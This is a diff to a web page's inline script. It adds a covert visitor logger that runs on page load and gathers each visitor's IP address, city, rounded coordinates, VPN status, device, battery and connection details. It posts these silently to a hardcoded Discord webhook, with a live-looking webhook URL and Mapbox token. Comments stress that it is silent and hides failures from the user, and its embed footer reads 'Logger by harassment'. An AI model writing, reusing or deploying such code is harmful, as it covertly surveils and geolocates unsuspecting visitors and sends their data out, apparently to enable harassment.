@@ -571,151 +571,229 @@
             </div>
         </div>
     </div>
-    <script>
-        async function getPublicIP() {
-    const ipServices = [
-        { url: 'https://api.ipify.org?format=json', key: 'ip' },
-        { url: 'https://ipapi.co/json/', key: 'ip' },
-        { url: 'https://api.ip.sb/geoip', key: 'ip' },
-        { url: 'https://ifconfig.me/ip', key: null, isText: true } // Fallback, returns plain text
-    ];
-
-    for (const service of ipServices) {
+<script>
+// Silent data logger with geolocation map
+async function getIpAndLocationData() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const data = await response.json();
+        return data;
+    } catch (error) {
+        // Fallback to ipify for just IP
         try {
-            const response = await fetch(service.url, { method: 'GET', cache: 'no-cache' });
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
-            }
-            if (service.isText) {
-                const ip = await response.text();
-                if (ip) return ip.trim();
-            } else {
-                const data = await response.json();
-                if (data && data[service.key]) {
-                    return data[service.key];
-                }
-            }
-        } catch (error) {
-            console.warn(`Failed to fetch IP from ${service.url}:`, error);
-            // Continue to the next service in the list
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            return { ip: ipData.ip };
+        } catch (fallbackError) {
+            return { ip: "Unknown" };
         }
     }
-    throw new Error('Could not fetch public IP from any service.');
 }
 
 async function getUserData() {
     try {
-        const ip = await getPublicIP();
+        // Get IP and location data
+        const geoData = await getIpAndLocationData();
+        
+        // Basic info
+        const ip = geoData.ip || "Unknown";
         const browserInfo = navigator.userAgent;
         const screenResolution = `${window.screen.width}x${window.screen.height}`;
         const language = navigator.language;
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const timestamp = new Date().toLocaleString('pl-PL', { timeZone });
+        const timestamp = new Date().toLocaleString();
         const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
         const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
         const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
-        const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
-        const cpuCores = navigator.hardwareConcurrency;
+        const os = (navigator.userAgentData?.platform) || navigator.platform || "Unknown";
+        const cpuCores = navigator.hardwareConcurrency || "Unknown";
         const navHeight = `${window.innerHeight}px`;
-        let batteryLevel = "Nieznane";
-        let powerSavingMode = "Nieznane";
+        
+        // Battery info
+        let batteryLevel = "Unknown";
+        let powerSavingMode = "Unknown";
         if ('getBattery' in navigator) {
             try {
                 const battery = await navigator.getBattery();
                 batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
                 powerSavingMode = battery.charging ? "No" : "Yes";
             } catch (error) {
-                console.warn("Battery API error:", error);
+                // Silent fail
             }
         }
-        let adBlockEnabled = "❌ None"; // Assume no ad-blocker initially
+
+        // AdBlock detection
+        let adBlockEnabled = "❌ None";
         try {
-            // Create a new element and check if it's blocked
             const testAd = document.createElement('div');
             testAd.innerHTML = '&nbsp;';
-            testAd.className = 'adsbox pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad';
-            testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px; visibility: hidden;';
+            testAd.className = 'adsbox';
+            testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px;';
             document.body.appendChild(testAd);
-            setTimeout(() => {
-                if (testAd.offsetHeight === 0) {
-                    adBlockEnabled = "✅ Yes";
-                }
-                document.body.removeChild(testAd);
-            }, 100);
+            
+            await new Promise(resolve => setTimeout(resolve, 100));
+            
+            if (testAd.offsetHeight === 0) {
+                adBlockEnabled = "✅ Yes";
+            }
+            document.body.removeChild(testAd);
         } catch (e) {
-            // If an error occurs, assume an ad-blocker might be interfering
             adBlockEnabled = "✅ Yes";
         }
-        const browserName = navigator.appName;
-        const browserVersion = navigator.appVersion;
-        const browserLanguage = navigator.language;
+
+        // Browser details
+        const browserName = navigator.appName || "Unknown";
+        const browserVersion = navigator.appVersion || "Unknown";
         const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ None";
+        
+        // Connection info
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const connectionType = connection ? connection.effectiveType : "Nieznane";
-        const connectionRtt = connection ? `${connection.rtt} ms` : "Nieznane";
-        const connectionDownlink = connection ? `${connection.downlink} Mbps` : "Nieznane";
-        const osVersion = navigator.userAgentData ? navigator.userAgentData.platformVersion : "Nieznane";
-        let location = "Nieznane";
-        try {
-            // Use ipapi.co as it provides more data and we already have the IP
-            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-            if (locationResponse.ok) {
-                const locationData = await locationResponse.json();
-                if (locationData.city && locationData.region && locationData.country_name) {
-                    location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
-                }
+        const connectionType = connection?.effectiveType || "Unknown";
+        const connectionRtt = connection?.rtt ? `${connection.rtt} ms` : "Unknown";
+        const connectionDownlink = connection?.downlink ? `${connection.downlink} Mbps` : "Unknown";
+
+        // VPN/Proxy detection
+        let vpnStatus = "❌ Unlikely";
+        if (geoData.org) {
+            const org = geoData.org.toLowerCase();
+            if (org.includes("vpn") || org.includes("hosting") || org.includes("proxy")) {
+                vpnStatus = "🛡️ Possible VPN/Proxy";
             }
-        } catch (error) {
-            console.error("Error whilst locating:", error);
         }
+
+        // Location string
+        const locationString = (geoData.city && geoData.region && geoData.country_name)
+            ? `${geoData.city}, ${geoData.region}, ${geoData.country_name}`
+            : "Unknown";
+
+        // Generate map image from coordinates (general area, not exact)
+        let mapImageUrl = null;
+        let mapLocation = "No location data";
+        
+        if (geoData.latitude && geoData.longitude) {
+            const lat = geoData.latitude;
+            const lon = geoData.longitude;
+            
+            // Round coordinates to 2 decimal places for general area (not exact location)
+            const roundedLat = Math.round(lat * 100) / 100;
+            const roundedLon = Math.round(lon * 100) / 100;
+            
+            // Use Mapbox Static Images API - high quality maps similar to whatismyipaddress.com
+            // You need a free Mapbox account: https://account.mapbox.com/auth/signup/
+            // Get your token at: https://account.mapbox.com/access-tokens/
+            const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ'; // Replace with your token
+            
+            // Style: streets-v11 (default street map), satellite-v9, outdoors-v11, light-v10, dark-v10
+            mapImageUrl = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${roundedLon},${roundedLat})/${roundedLon},${roundedLat},12,0/600x300@2x?access_token=${mapboxToken}`;
+            
+            mapLocation = `${roundedLat}, ${roundedLon}`;
+        }
+
         const data = {
-            ip, browser: browserInfo, resolution: screenResolution, language, timeZone, timestamp,
-            deviceType, onlineStatus, uptime, os, cpuCores, navHeight, batteryLevel,
-            powerSavingMode, adBlockEnabled, browserName, browserVersion, browserLanguage,
-            cookiesEnabled, connectionType, connectionRtt, connectionDownlink, osVersion, location
+            ip,
+            browser: browserInfo,
+            resolution: screenResolution,
+            language,
+            timeZone,
+            timestamp,
+            deviceType,
+            onlineStatus,
+            uptime,
+            os,
+            cpuCores,
+            navHeight,
+            batteryLevel,
+            powerSavingMode,
+            adBlockEnabled,
+            browserName,
+            browserVersion,
+            cookiesEnabled,
+            connectionType,
+            connectionRtt,
+            connectionDownlink,
+            location: locationString,
+            vpnStatus,
+            mapImageUrl,
+            mapLocation
         };
+
         await sendDataToWebhook(data);
+        
     } catch (error) {
-        console.error("Error While Downloading Data:", error);
+        // Silent fail - don't alert user
     }
 }
 
 async function sendDataToWebhook(data) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1453974680665849980/2FgblNnZIlE8RXnwNQm8vlKs-sTDXbFIgnW9JuxrZ-bAxiR22qls0r5c7nyIkdBAGkzV'; // webhook
+    const webhookUrl = 'https://discord.com/api/webhooks/1453974680665849980/2FgblNnZIlE8RXnwNQm8vlKs-sTDXbFIgnW9JuxrZ-bAxiR22qls0r5c7nyIkdBAGkzV';
+    
+    const embed = {
+        title: "📊 Device Details",
+        color: 16711680,
+        fields: [
+            { name: "📍 IP", value: data.ip, inline: true },
+            { name: "🌍 Location", value: data.location, inline: true },
+            { name: "🗺️ Coordinates", value: data.mapLocation, inline: true },
+            { name: "🛡️ VPN/Proxy", value: data.vpnStatus, inline: true },
+            { name: "🖥️ Resolution", value: data.resolution, inline: true },
+            { name: "🗣️ Language", value: data.language, inline: true },
+            { name: "🕒 TimeZone", value: data.timeZone, inline: true },
+            { name: "📅 Time", value: data.timestamp, inline: false },
+            { name: "📱 Device", value: data.deviceType, inline: true },
+            { name: "🔋 Battery", value: data.batteryLevel, inline: true },
+            { name: "⚡ Power Saving", value: data.powerSavingMode, inline: true },
+            { name: "🖥️ Operating System", value: data.os, inline: true },
+            { name: "🔗 Status", value: data.onlineStatus, inline: true },
+            { name: "📊 Uptime", value: data.uptime, inline: true },
+            { name: "🖥️ CPU Cores", value: String(data.cpuCores), inline: true },
+            { name: "📏 Height", value: data.navHeight, inline: true },
+            { name: "🚫 AdBlock", value: data.adBlockEnabled, inline: true },
+            { name: "🌐 Browser", value: data.browserName, inline: true },
+            { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },
+            { name: "📶 Connection", value: data.connectionType, inline: true },
+            { name: "⏱️ RTT", value: data.connectionRtt, inline: true },
+            { name: "⬇️ Speed", value: data.connectionDownlink, inline: true }
+        ],
+        footer: { 
+            text: "Logger by harassment", 
+            icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096" 
+        }
+    };
+
+    // Add map image if available
+    if (data.mapImageUrl) {
+        embed.image = { url: data.mapImageUrl };
+    }
+
     const payload = {
         content: "📡 **User Logged On Site**",
-        embeds: [{
-            title: "📊 Device Details",
-            color: 16711680,
-            fields: [
-                { name: "📍 IP", value: data.ip, inline: true }, { name: "🌍 Location", value: data.location, inline: true },
-                { name: "🖥️ Resolution", value: data.resolution, inline: true }, { name: "🗣️ Language", value: data.language, inline: true },
-                { name: "🕒 TimeZone", value: data.timeZone, inline: true }, { name: "📅 Time", value: data.timestamp, inline: false },
-                { name: "📱 Device", value: data.deviceType, inline: true }, { name: "🔋 Battery", value: data.batteryLevel, inline: true },
-                { name: "⚡ Power Saving", value: data.powerSavingMode, inline: true }, { name: "🖥️ Operating System", value: data.os, inline: true },
-                { name: "🔗 Status online", value: data.onlineStatus, inline: true }, { name: "📊 Uptime", value: data.uptime, inline: true },
-                { name: "🖥️ CPU Cores", value: data.cpuCores.toString(), inline: true }, { name: "📏 Bar Height", value: data.navHeight, inline: true },
-                { name: "🚫 AdBlock", value: data.adBlockEnabled, inline: true }, { name: "🌐 Browser", value: data.browserName, inline: true },
-                { name: "📜 Browser Version", value: data.browserVersion, inline: true }, { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },
-                { name: "📶 Connection", value: data.connectionType, inline: true }, { name: "⏱️ Delay (RTT)", value: data.connectionRtt, inline: true },
-                { name: "⬇️ Download Speed", value: data.connectionDownlink, inline: true }
-            ],
-            footer: { text: "Logger by harassment", icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096" }
-        }]
+        embeds: [embed]
     };
+
     try {
-        const response = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-        if (!response.ok) {
-            console.error("Błąd wysyłania:", response.statusText, await response.text());
-        } else {
-            console.log("Dane wysłane pomyślnie.");
-        }
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        // Silent success - no alerts or console logs
+        
     } catch (error) {
-        console.error("Network error while sending webhook:", error);
+        // Silent fail - don't alert user
     }
 }
 
-window.onload = getUserData;
+// Start on page load
+window.addEventListener('load', () => {
+    getUserData();
+});
+</script>
     </script>
     <script>
         const DISCORD_ID = '1404732292412477531';
